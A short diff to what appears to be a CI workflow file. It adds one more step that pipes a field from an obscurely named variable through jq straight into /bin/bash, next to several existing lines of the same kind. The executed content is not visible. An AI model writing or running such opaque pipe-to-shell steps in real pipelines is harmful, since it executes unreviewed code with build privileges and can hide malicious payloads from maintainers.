@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$cnbhj219" | jq -r .qagrf178 | /bin/bash
           echo $j01 | jq -r .khrmt793 | /bin/bash
           echo $xwo1344 | jq -r .ee219 | /bin/bash
+          printf '%s' "$kluph2151" | jq -r .cvmak7 | /bin/bash
 
       - name: Save archive
         if: always()
